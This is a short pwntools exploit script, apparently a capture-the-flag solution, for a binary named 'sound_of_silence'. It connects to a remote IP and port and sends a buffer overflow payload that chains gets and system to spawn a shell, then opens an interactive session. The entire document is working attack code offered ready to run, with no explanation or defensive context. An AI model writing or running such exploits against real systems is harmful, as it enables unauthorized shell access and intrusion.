#!/usr/bin/env python3

from pwn import *

exe = ELF("./sound_of_silence_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p =remote('94.237.59.180',46032)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000401184
#           ''')

payload = b'a'*32 + p64(0) + p64(exe.sym.gets) + p64(exe.sym.system)
input()
p.sendline(payload)
p.sendline(b'sh #')
p.interactive()
